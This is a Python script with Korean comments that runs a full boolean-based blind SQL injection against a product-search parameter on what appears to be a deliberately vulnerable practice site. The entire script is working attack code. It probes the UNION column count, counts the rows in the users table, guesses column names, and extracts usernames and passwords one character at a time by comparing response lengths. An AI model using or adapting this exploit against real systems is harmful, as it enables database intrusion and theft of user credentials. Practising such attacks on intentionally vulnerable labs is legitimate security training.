# http://owasp.vulunch.kr/products?search=admin%27/**/union%20select%201,%201,%201,%201,%201,%201,%201/**/from%20users%20%23--

import requests
import string
import time

BASE_URL = "http://owasp.vulunch.kr"

# try col numbers
print("=== 컬럼 수 찾기 ===")
for i in range(1, 30):
    resp = requests.get(f"{BASE_URL}/products?search=admin'/**/union select {str('1,') * (i-1)}1/**/from%20users%20where%201=1%20and%20'1'='1")
    print(f"컬럼 {i}: 상태코드 {resp.status_code}")
    
    if resp.status_code != 500:
        print(f"✅ 컬럼 수: {i}")
        break

print("\n=== users 테이블 레코드 수 brute force ===")
for i in range(1, 101):
    payload = f"AlphaBot' and (select count(*) from users) = {i} and '1'='1"
    resp = requests.get(f"{BASE_URL}/products?search={payload}")
    
    print(f"레코드 수 {i}: 상태코드 {resp.status_code}, 응답 길이: {len(resp.text)}")
    
    if resp.status_code == 200:
        response_text = resp.text.lower()
        
        if not any(error in response_text for error in ['error', 'syntax', 'oracle', 'sql', 'exception', 'ora-']):
            print(f"✅ users 테이블에 {i}개의 레코드가 존재할 가능성이 높습니다!")
            
            print(f"응답 미리보기: {resp.text[:200]}...")
            break
    
    time.sleep(0.1)

print("\n=== admin 사용자 존재 확인 ===")
    
TRUE_BASELINE = 0
FALSE_BASELINE = 0

def setup_baseline():
    """참/거짓 조건의 응답 길이 baseline 설정"""
    global TRUE_BASELINE, FALSE_BASELINE
    
    print("🔧 응답 길이 baseline 설정...")
    
    true_payload = f"AlphaBot' and (select 1 from dual) = 1 and '1'='1"
    true_resp = requests.get(f"{BASE_URL}/products?search={true_payload}")
    TRUE_BASELINE = len(true_resp.text)
    
    false_payload = f"AlphaBot' and (select 1 from dual) = 2 and '1'='1"
    false_resp = requests.get(f"{BASE_URL}/products?search={false_payload}")
    FALSE_BASELINE = len(false_resp.text)
    
    print(f"✅ TRUE 조건 길이: {TRUE_BASELINE}")
    print(f"✅ FALSE 조건 길이: {FALSE_BASELINE}")
    
    threshold = (TRUE_BASELINE + FALSE_BASELINE) // 2
    print(f"✅ 판단 기준점: {threshold}")
    
    return threshold

THRESHOLD = setup_baseline()

def check_condition(condition):
    """조건이 참인지 확인하는 함수"""
    payload = f"AlphaBot' and {condition} and '1'='1"
    resp = requests.get(f"{BASE_URL}/products?search={payload}")
    
    print(f"    테스트: {condition}... -> 상태코드: {resp.status_code}, 길이: {len(resp.text)}")
    
    if resp.status_code == 200:
        response_text = resp.text.lower()
        has_error = any(error in response_text for error in ['error', 'syntax', 'oracle', 'sql', 'exception', 'warning', 'ora-'])
        
        if has_error:
            return False
            
        is_true = len(resp.text) > THRESHOLD
        print(f"    판단: {'TRUE' if is_true else 'FALSE'} (기준: {THRESHOLD})")
        return is_true
    return False

possible_columns = ['username', 'user', 'name', 'login', 'userid', 'user_id']
admin_column = None

print("\n🔍 admin 사용자 컬럼 찾기...")
for col in possible_columns:
    condition = f"(select count(*) from users where {col}='admin') = 1"
    if check_condition(condition):
        print(f"✅ admin 사용자가 {col} 컬럼에 존재합니다!")
        admin_column = col
        break
    time.sleep(0.1)

if not admin_column:
    print("❌ 'admin' 사용자를 찾을 수 없습니다. 다른 사용자명들을 시도합니다...")

    common_usernames = ['administrator', 'root', 'user', 'test', 'guest', 'demo', 'sa', 'system', 'oracle']
    
    for username in common_usernames:
        for col in possible_columns:
            condition = f"(select count(*) from users where {col}='{username}') = 1"
            if check_condition(condition):
                print(f"✅ '{username}' 사용자가 {col} 컬럼에 존재합니다!")
                admin_column = col
                admin_username = username
                break
            time.sleep(0.1)
        if admin_column:
            break
    
    if not admin_column:
        print("❌ 알려진 사용자명을 찾을 수 없습니다.")
        print("=== 완료 ===")
        exit()
else:
    admin_username = 'admin'

print(f"\n=== {admin_column} 컬럼에서 '{admin_username}' 정보 추출 ===")

password_columns = ['password', 'passwd', 'pwd', 'pass', 'user_password']
password_column = None

for col in password_columns:
    condition = f"(select count(*) from users where {admin_column}='{admin_username}' and {col} IS NOT NULL) = 1"
    if check_condition(condition):
        print(f"✅ 패스워드 컬럼 발견: {col}")
        password_column = col
        break
    time.sleep(0.1)

def extract_data(column_name, where_condition=""):
    """Boolean-based blind SQL injection으로 데이터 추출"""
    result = ""
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?/~`"
    
    print(f"\n--- {column_name} 데이터 추출 중 ---")
    
    data_length = 0
    print("데이터 길이 확인 중...")
    for length in range(1, 51):
        condition = f"(select LENGTH({column_name}) from users {where_condition}) = {length}"
        if check_condition(condition):
            data_length = length
            print(f"✅ 데이터 길이: {data_length}")
            break
        time.sleep(0.1)
    
    if data_length == 0:
        print(f"❌ {column_name} 데이터 길이를 찾을 수 없습니다.")
        return ""
    
    for pos in range(1, data_length + 1):
        found_char = None
        print(f"\n위치 {pos} 문자 추출 중...")
        
        common_chars = string.ascii_lowercase + string.digits + string.ascii_uppercase
        
        priority_chars = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        
        for char in priority_chars:
            condition = f"(select substr({column_name}, {pos}, 1) from users {where_condition}) = '{char}'"
            if check_condition(condition):
                result += char
                print(f"✅ 위치 {pos}: '{char}' -> 현재 결과: '{result}'")
                found_char = char
                break
            time.sleep(0.03)
        
        if not found_char:
            print(f"    일반 문자로 안됨, ASCII 비교 시도...")
            for char in charset:
                condition = f"(select ascii(substr({column_name}, {pos}, 1)) from users {where_condition}) = {ord(char)}"
                if check_condition(condition):
                    result += char
                    print(f"✅ 위치 {pos}: '{char}' (ASCII {ord(char)}) -> 현재 결과: '{result}'")
                    found_char = char
                    break
                time.sleep(0.05)
        
        if not found_char:
            print(f"    ASCII 범위별 확인...")
            ranges = [
                (32, 47),
                (48, 57),
                (58, 64),
                (65, 90),
                (91, 96),
                (97, 122),
                (123, 126),
            ]
            
            for start, end in ranges:
                for ascii_val in range(start, end + 1):
                    char = chr(ascii_val)
                    condition = f"(select ascii(substr({column_name}, {pos}, 1)) from users {where_condition}) = {ascii_val}"
                    if check_condition(condition):
                        result += char
                        print(f"✅ 위치 {pos}: '{char}' (ASCII {ascii_val}) -> 현재 결과: '{result}'")
                        found_char = char
                        break
                    time.sleep(0.05)
                if found_char:
                    break
        
        if not found_char:
            print(f"❌ 위치 {pos}에서 문자를 찾을 수 없습니다.")
            result += "?"
    
    return result

admin_username = 'bob_edu'

where_clause = f"where {admin_column}='{admin_username}'"

print(f"\n🧪 간단한 테스트 - {admin_column}의 첫 번째 문자 확인:")
test_chars = "abcdefghijklmnopqrstuvwxyz0123456789"
first_char = None


for char in test_chars:
    condition = f"(select substr({admin_column}, 1, 1) from users {where_clause}) = '{char}'"
    print(f"  '{char}' 테스트 중...")
    if check_condition(condition):
        first_char = char
        print(f"✅ 첫 번째 문자: '{char}'")
        break
    time.sleep(0.1)

if not first_char:
    print("❌ 첫 번째 문자를 찾을 수 없습니다. ASCII로 다시 시도...")
    for i in range(32, 127):
        char = chr(i)
        condition = f"(select ascii(substr({admin_column}, 1, 1)) from users {where_clause}) = {i}"
        if check_condition(condition):
            first_char = char
            print(f"✅ 첫 번째 문자: '{char}' (ASCII: {i})")
            break
        time.sleep(0.1)

print(f"\n🔍 사용자명 추출:")
username = extract_data(admin_column, where_clause)
if password_column:
    print(f"\n🔑 패스워드 추출:")
    password = extract_data(password_column, where_clause)
    print(f"\n✅ 최종 결과:")
    print(f"사용자명: {username}")
    print(f"패스워드: {password}")
else:
    print("\n❌ 패스워드 컬럼을 찾을 수 없습니다.")

    other_columns = ['email', 'phone', 'role', 'privilege', 'level', 'status']
    for col in other_columns:
        condition = f"(select count(*) from users where {admin_column}='{admin_username}' and {col} IS NOT NULL) = 1"
        if check_condition(condition):
            print(f"\n📧 {col} 컬럼 발견, 데이터 추출:")
            data = extract_data(col, where_clause)
            print(f"{col}: {data}")
        time.sleep(0.1)


print("\n=== 완료 ===")
